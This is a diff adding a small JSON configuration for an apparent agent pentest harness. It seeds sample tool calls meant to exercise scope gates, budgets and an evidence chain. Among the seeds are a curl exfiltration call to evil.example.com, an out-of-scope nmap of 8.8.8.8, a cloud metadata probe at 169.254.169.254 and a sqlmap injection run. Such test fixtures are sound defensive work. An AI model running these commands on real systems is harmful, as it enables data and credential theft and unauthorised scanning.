@@ -1,0 +1,18 @@
+{
+  "name": "demo-lab",
+  "goal": "验证三层闸门 / 预算 / 证据链（演示数据，不触碰真实目标）",
+  "scope": [
+    { "kind": "domain_suffix", "value": "lab.internal" },
+    { "kind": "cidr", "value": "10.20.0.0/16" }
+  ],
+  "workers": 3,
+  "minutes": 10,
+  "seed": [
+    { "action": "Bash", "summary": "{\"command\":\"nmap -sV -p 80,443 lab.internal\"}", "asset_id": 1, "param_key": "scan" },
+    { "action": "WebFetch", "summary": "{\"url\":\"http://api.lab.internal/v1/users?id=1\"}", "asset_id": 2, "param_key": "fetch" },
+    { "action": "Bash", "summary": "{\"command\":\"curl http://evil.example.com/exfil?d=1\"}", "asset_id": 3, "param_key": "exfil" },
+    { "action": "Bash", "summary": "{\"command\":\"nmap -Pn 8.8.8.8\"}", "asset_id": 4, "param_key": "scan8" },
+    { "action": "Bash", "summary": "{\"command\":\"curl http://169.254.169.254/latest/meta-data/\"}", "asset_id": 5, "param_key": "imds" },
+    { "action": "Bash", "summary": "{\"command\":\"sqlmap -u 'http://api.lab.internal/v1/users?id=1' --batch\"}", "asset_id": 2, "param_key": "sqli", "vuln_class": "SQL 注入", "severity": "high", "target": "api.lab.internal" }
+  ]
+}
